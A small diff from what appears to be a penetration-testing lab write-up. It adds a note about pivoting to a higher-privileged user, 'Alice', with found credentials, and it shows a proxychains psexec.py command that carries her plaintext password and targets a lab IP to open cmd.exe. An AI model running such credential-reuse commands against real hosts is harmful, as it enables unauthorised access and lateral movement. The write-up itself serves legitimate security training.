@@ -782,6 +782,7 @@ System Type:               x64-based PC
 ````
 ### Pivoting
 #### psexec.py
+Using credentials that we wound for Alice we were able to psexec.py on my kali machine using chisel to Alices Account as she has higher privledges then my current user.
 ````
 proxychains psexec.py alice:aliceishere@10.11.1.50 cmd.exe
 ````
